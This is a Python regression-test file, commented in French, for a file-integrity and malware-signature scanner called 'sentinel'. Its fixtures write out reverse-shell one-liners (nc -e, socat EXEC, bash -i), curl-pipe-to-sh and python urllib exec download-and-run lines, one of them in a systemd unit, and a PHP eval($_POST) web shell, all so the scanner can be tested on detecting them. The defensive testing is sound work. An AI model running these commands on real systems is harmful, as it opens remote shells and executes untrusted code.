"""Non-régressions V5 — bugs trouvés en exécutant réellement l'outil.

Chaque classe correspond à un défaut constaté (mesuré), pas supposé :

  1. Normalisation : `\\n` échappé et base64 décodé ajoutaient des lignes
     au texte normalisé → tous les findings suivants pointaient sur une
     mauvaise ligne (et l'attaquant choisissait le décalage).
  2. Préfiltres `quick_keywords` désynchronisés des regex : `nc.exe`,
     `nc\\t-e` (SIG-0002) et `curl … | sh` dans une unité systemd
     (SIG-0017) étaient sautés sans être vus.
  3. Baseline V1 : uid/gid absents comparés à 0 → chaque fichier ressortait
     en `owner_changed`.
  4. `owner_changed` / `cap_changed` absents de `exit_code` : un `chown`
     sortait en 0 (CI verte).
  5. `--encrypt-key` sur `scan` : drapeau jamais lu, et SIG-0019
     silencieusement désactivée sur une baseline chiffrée.
  6. Quarantaine : manifest écrit après la boucle complète → un crash
     perdait l'audit des fichiers déjà déplacés.
  7. Findings filtrés invisibles (ni JSON, ni SARIF, ni texte).
  8. Fichiers volumineux lus intégralement en RAM pour le SHA-256.
  9. Symlink re-ciblé invisible dans le diff d'intégrité.
"""

from __future__ import annotations

import base64
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from sentinel.integrity import (
    diff_against_baseline,
    make_baseline,
    verify_baseline_key,
)
from sentinel.models import Finding, IntegrityDiff, Report
from sentinel.normalize import normalize_for_rules
from sentinel.reporting import render_json, render_sarif, render_text
from sentinel.scanner import scan_folder
from sentinel.sentinelignore import apply_ignore

ROOT = Path(__file__).resolve().parents[1]


def _run_cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-m", "sentinel", *args],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )


class TestNormalizeKeepsLineNumbers(unittest.TestCase):
    def test_escaped_newlines_do_not_add_lines(self) -> None:
        src = 'x = "a\\nb"\ny = "c\\nd"\npayload\n'
        norm = normalize_for_rules(src)
        self.assertEqual(src.count("\n"), norm.count("\n"))

    def test_b64_decoded_newlines_do_not_add_lines(self) -> None:
        payload = base64.b64encode(b"# padding padding\n\n\neval($_POST['x']);\n\n").decode()
        src = f"$x = '{payload}';\n$y = 2;\n"
        norm = normalize_for_rules(src)
        self.assertEqual(src.count("\n"), norm.count("\n"))

    def test_finding_line_is_correct_after_escaped_newline(self) -> None:
        """Le vrai symptôme : le finding doit pointer la bonne ligne."""
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "a.sh").write_text('echo "a\\nb"\necho "c\\nd"\ncurl -s http://x | sh\n')
            report = scan_folder(td)
            hits = [f for f in report.findings if f.rule_id == "SIG-0003"]
            self.assertEqual(len(hits), 1, report.findings)
            self.assertEqual(hits[0].line, 3)

    def test_hex_unicode_and_octal_newlines_do_not_shift_findings(self) -> None:
        """`\\x0a`, `\\u000a` et l'octal `\\012` sont aussi des sauts de ligne."""
        for escape in ("\\x0a", "\\u000a", "\\012"):
            src = f'echo "a{escape}b"\ncurl -s http://x | sh\n'
            norm = normalize_for_rules(src)
            self.assertEqual(src.count("\n"), norm.count("\n"), escape)
            with tempfile.TemporaryDirectory() as td:
                td = Path(td)
                (td / "a.sh").write_text(src)
                hits = [f for f in scan_folder(td).findings if f.rule_id == "SIG-0003"]
                self.assertEqual(len(hits), 1, escape)
                self.assertEqual(hits[0].line, 2, escape)


class TestPrefilterDoesNotHideFindings(unittest.TestCase):
    def _scan(self, name: str, body: str):
        td = tempfile.mkdtemp()
        p = Path(td) / name
        p.write_text(body)
        return scan_folder(Path(td))

    def test_nc_exe_is_detected(self) -> None:
        report = self._scan("x.sh", "nc.exe 10.0.0.1 4444 -e cmd.exe\n")
        self.assertIn("SIG-0002", [f.rule_id for f in report.findings])

    def test_nc_with_tab_is_detected(self) -> None:
        report = self._scan("y.sh", "nc\t-e /bin/sh 1.2.3.4 4444\n")
        self.assertIn("SIG-0002", [f.rule_id for f in report.findings])

    def test_systemd_unit_with_curl_pipe_sh_is_detected(self) -> None:
        """SIG-0017 ne voyait pas la forme réelle `curl -s URL | sh`."""
        body = '[Service]\nExecStart=/bin/bash -c "curl -s http://evil/x | sh"\n'
        report = self._scan("evil.service", body)
        ids = [f.rule_id for f in report.findings]
        self.assertIn("SIG-0017", ids, ids)

    def test_systemd_unit_with_nc_exe_is_detected(self) -> None:
        body = "[Service]\nExecStart=/usr/bin/nc.exe 1.2.3.4 4444 -e cmd.exe\n"
        report = self._scan("nc.service", body)
        self.assertIn("SIG-0017", [f.rule_id for f in report.findings])

    def test_bash_i_with_tab_or_extra_space_is_detected(self) -> None:
        for body in ("bash\t-i >& /dev/null\n", "bash  -i >& /dev/null\n"):
            report = self._scan("x.sh", body)
            self.assertIn("SIG-0002", [f.rule_id for f in report.findings], repr(body))

    def test_socat_exec_not_at_column_zero_is_detected(self) -> None:
        body = "/usr/bin/socat TCP:1.2.3.4:4444 EXEC:/bin/sh\n"
        report = self._scan("a.sh", body)
        self.assertIn("SIG-0002", [f.rule_id for f in report.findings])
        unit = "[Service]\nExecStart=/usr/bin/socat TCP:1.2.3.4:4444 EXEC:/bin/sh\n"
        report = self._scan("evil.service", unit)
        self.assertIn("SIG-0017", [f.rule_id for f in report.findings])

    def test_python3_urllib_exec_is_detected(self) -> None:
        body = "python3 -c 'import urllib; exec(urllib.request.urlopen(\"http://x\").read())'\n"
        report = self._scan("a.sh", body)
        self.assertIn("SIG-0003", [f.rule_id for f in report.findings])


class TestBaselineV1Compatibility(unittest.TestCase):
    def test_v1_baseline_does_not_flag_every_file_as_owner_changed(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "a.txt").write_text("hello\n")
            (td / "b.txt").write_text("world\n")
            current = make_baseline(td)
            v1 = {
                "version": 1,
                "root": str(td),
                "entries": [
                    {"path": e["path"], "sha256": e["sha256"], "size": e["size"], "mode": e["mode"]}
                    for e in current["entries"]
                ],
            }
            diff = diff_against_baseline(current, v1)
            self.assertEqual(diff.owner_changed, [])
            self.assertEqual(diff.modified, [])

    def test_unknown_entry_fields_are_ignored(self) -> None:
        """Une baseline plus récente ne doit pas faire planter le diff."""
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "a.txt").write_text("hello\n")
            current = make_baseline(td)
            ref = json.loads(json.dumps(current))
            ref["entries"][0]["future_field"] = "ignored"
            diff = diff_against_baseline(current, ref)
            self.assertEqual(diff.modified, [])


class TestOwnerChangeAffectsExitCode(unittest.TestCase):
    def test_owner_change_alone_exits_1(self) -> None:
        report = Report(integrity=IntegrityDiff(owner_changed=["a.txt"]))
        self.assertEqual(report.exit_code, 1)

    def test_cap_change_alone_exits_1(self) -> None:
        report = Report(integrity=IntegrityDiff(cap_changed=["bin/x"]))
        self.assertEqual(report.exit_code, 1)


class TestEncryptedBaseline(unittest.TestCase):
    def test_key_check_is_stored_and_verifiable(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "a.txt").write_text("hello\n")
            bl = make_baseline(td, encrypt_key="k1")
            self.assertTrue(bl["encrypted"])
            self.assertIn("key_check", bl)
            self.assertTrue(verify_baseline_key(bl, "k1"))
            self.assertFalse(verify_baseline_key(bl, "k2"))

    def test_content_is_not_stored(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "authorized_keys").write_text("ssh-ed25519 SECRET\n")
            bl = make_baseline(td, encrypt_key="k1")
            self.assertNotIn("ssh-ed25519", json.dumps(bl))

    def test_scan_warns_that_sig0019_is_disabled(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "authorized_keys").write_text("ssh-ed25519 AAAA\n")
            base = td / "base.json"
            base.write_text(json.dumps(make_baseline(td, encrypt_key="k")))
            (td / "authorized_keys").write_text("ssh-ed25519 AAAA\nssh-ed25519 BBBB\n")

            r = _run_cli("scan", str(td), "--baseline", str(base), "--encrypt-key", "k")
            self.assertIn("SIG-0019", r.stderr, "le warning doit nommer la règle désactivée")

    def test_scan_with_wrong_key_exits_2(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "a.txt").write_text("hello\n")
            base = td / "base.json"
            base.write_text(json.dumps(make_baseline(td, encrypt_key="right")))

            r = _run_cli("scan", str(td), "--baseline", str(base), "--encrypt-key", "wrong")
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn("Clé incorrecte", r.stderr)


class TestQuarantineManifestIsTransactional(unittest.TestCase):
    def test_manifest_has_entry_when_batch_is_interrupted(self) -> None:
        """Un crash au 2e fichier ne doit pas perdre l'audit du 1er."""
        from sentinel import quarantine as Q

        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            src = td / "src"
            src.mkdir()
            for n in ("a.txt", "b.txt", "c.txt"):
                (src / n).write_text(f"contenu {n}\n")
            dest = td / "q"
            manifest = dest / "manifest.jsonl"

            real = Q._perform_quarantine_move
            calls = {"n": 0}

            def flaky(plan):
                calls["n"] += 1
                if calls["n"] == 2:
                    raise KeyboardInterrupt  # crash brutal au 2e fichier
                return real(plan)

            Q._perform_quarantine_move = flaky
            try:
                with self.assertRaises(KeyboardInterrupt):
                    Q.quarantine_paths(
                        [src / "a.txt", src / "b.txt", src / "c.txt"], dest, manifest
                    )
            finally:
                Q._perform_quarantine_move = real

            self.assertTrue(manifest.is_file(), "le manifest doit exister malgré le crash")
            entries = [json.loads(ln) for ln in manifest.read_text().splitlines()]
            by_name: dict[str, list[str]] = {}
            for entry in entries:
                by_name.setdefault(Path(entry["original"]).name, []).append(entry["_status"])
            self.assertEqual(by_name["a.txt"], ["en cours", "done"])
            self.assertEqual(by_name["b.txt"], ["en cours"])
            self.assertNotIn("c.txt", by_name)
            self.assertFalse((src / "a.txt").exists())
            self.assertTrue((src / "b.txt").is_file())


class TestIgnoredFindingsAreVisible(unittest.TestCase):
    def _report(self) -> Report:
        td = Path(tempfile.mkdtemp())
        (td / "x.php").write_text('eval($_POST["x"]);\n')
        (td / ".sentinelignore").write_text("SIG-0001 anywhere faux positif connu 2026-10-18\n")
        report = scan_folder(td)
        return apply_ignore(report, ignore_file=td / ".sentinelignore")

    def test_json_contains_ignored_findings(self) -> None:
        payload = json.loads(render_json(self._report()))
        self.assertGreaterEqual(payload["ignored_count"], 1)
        self.assertTrue(payload["ignored_findings"])
        self.assertEqual(payload["ignored_findings"][0]["reason"], "faux positif connu")
        self.assertEqual(payload["ignored_findings"][0]["date"], "2026-10-18")

    def test_sarif_marks_ignored_as_suppressed(self) -> None:
        sarif = json.loads(render_sarif(self._report()))
        results = sarif["runs"][0]["results"]
        suppressed = [r for r in results if "suppressions" in r]
        self.assertTrue(suppressed, results)
        self.assertIn("justification", suppressed[0]["suppressions"][0])
        self.assertEqual(suppressed[0]["suppressions"][0]["justification"], "faux positif connu")

    def test_text_mentions_filtered_count(self) -> None:
        text = render_text(self._report())
        self.assertIn("ignored_findings", text)
        self.assertIn("faux positif connu", text)

    def test_text_shows_owner_and_cap_changes(self) -> None:
        report = Report(integrity=IntegrityDiff(owner_changed=["a"], cap_changed=["b"]))
        text = render_text(report)
        self.assertIn("owner_changed: a", text)
        self.assertIn("cap_changed: b", text)


class TestLargeFilesAreStreamed(unittest.TestCase):
    def test_large_file_hashed_without_content(self) -> None:
        """Au-delà de 64 KB : hash correct, contenu non embarqué, pas de OOM."""
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            big = td / "big.bin"
            big.write_bytes(b"a" * (200 * 1024))
            entry = make_baseline(td)["entries"][0]
            self.assertIsNone(entry["content"])
            self.assertEqual(len(entry["sha256"]), 64)
            import hashlib

            self.assertEqual(entry["sha256"], hashlib.sha256(b"a" * (200 * 1024)).hexdigest())


class TestSymlinkRetargetIsDetected(unittest.TestCase):
    def test_retargeted_symlink_is_modified(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            (td / "a.txt").write_text("A\n")
            (td / "b.txt").write_text("B\n")
            link = td / "link"
            link.symlink_to("a.txt")
            base = make_baseline(td)

            link.unlink()
            link.symlink_to("b.txt")
            current = make_baseline(td)

            diff = diff_against_baseline(current, base)
            self.assertIn("link", diff.modified, diff)


class TestVersionFlagPosition(unittest.TestCase):
    def test_version_only_in_first_position(self) -> None:
        self.assertEqual(_run_cli("--version").stdout.strip(), "sentinel 3.0.0")
        # `scan --version` n'est pas une demande de version : argparse doit
        # le rejeter comme argument inconnu.
        r = _run_cli("scan", ".", "--version")
        self.assertNotEqual(r.returncode, 0)


class TestFindingFingerprintStability(unittest.TestCase):
    def test_fingerprint_ignores_evidence(self) -> None:
        a = Finding("SIG-0001", "critical", "x.php", 3, "msg", "evidence A")
        b = Finding("SIG-0001", "critical", "x.php", 3, "msg", "evidence B")
        self.assertEqual(a.fingerprint(), b.fingerprint())


if __name__ == "__main__":
    unittest.main()
